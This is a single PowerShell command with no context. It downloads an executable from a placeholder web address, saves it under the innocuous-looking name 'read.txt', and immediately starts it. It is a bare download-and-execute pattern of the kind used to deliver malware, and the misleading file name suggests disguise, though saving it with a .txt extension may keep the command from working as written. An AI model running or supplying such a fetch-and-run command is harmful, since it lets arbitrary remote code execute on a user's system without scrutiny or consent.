powershell -Command "$url = 'https://www.example.com/file.exe'; $output = 'D:\read.txt'; Invoke-WebRequest -Uri $url -OutFile $output; Start-Process -FilePath $output"
